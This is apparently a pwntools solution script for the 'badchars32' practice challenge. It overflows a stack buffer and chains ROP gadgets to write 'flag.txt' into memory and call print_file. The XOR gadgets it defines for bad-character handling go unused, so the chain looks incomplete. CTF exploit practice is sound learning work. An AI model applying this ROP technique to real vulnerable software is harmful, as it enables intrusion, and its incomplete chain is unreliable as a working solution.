#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'error'
def convertString32(s):
     ans = ''
     for i in s:
         ans = hex(ord(i))[2:]+ans
     return int('0x'+ans, 16)
def main():
    exe = context.binary = ELF('./badchars32')
    p = process('./badchars32')
    r = ROP(context.binary)
	# for i in range(4):
	# 	print(p.recvline(timeout=1).decode('utf-8').strip('\n'))
	# before we start define ROPgadgets
    # xor BYTE PTR [ebp+0x0],bl; ret
    xor_bl = p32(0x08048547)
    #  mov    DWORD PTR [edi],esi; ret
    mov = p32( 0x0804854f)
	# take arguments off the stack and put them into edi and ebp
    popEdiEbp = p32(r.find_gadget(['pop edi', 'pop ebp', 'ret']).address)
	# 	mov    DWORD PTR [edi],ebp 0x08048543
	# writes what is in ebp to address pointed by edi
    usefulGadget = p32(0x8048543)
    writeable_addr = 0x0804a040 # address to write to in .bss
	# using gdb we found the offset to be 44
    exploit = 44*b'l'
	# gadget and           address to put into edi what to put into ebp
    exploit +=  popEdiEbp + p32(writeable_addr) + p32(convertString32('flag')) + usefulGadget
    exploit +=  popEdiEbp + p32(writeable_addr+4) + p32(convertString32('.txt')) + usefulGadget
    # call print_file with pointer to written memory
    r.call(exe.sym.plt.print_file, [writeable_addr])
    exploit += r.chain()
    sys.stdout.buffer.write(exploit)
    p.close()
main()
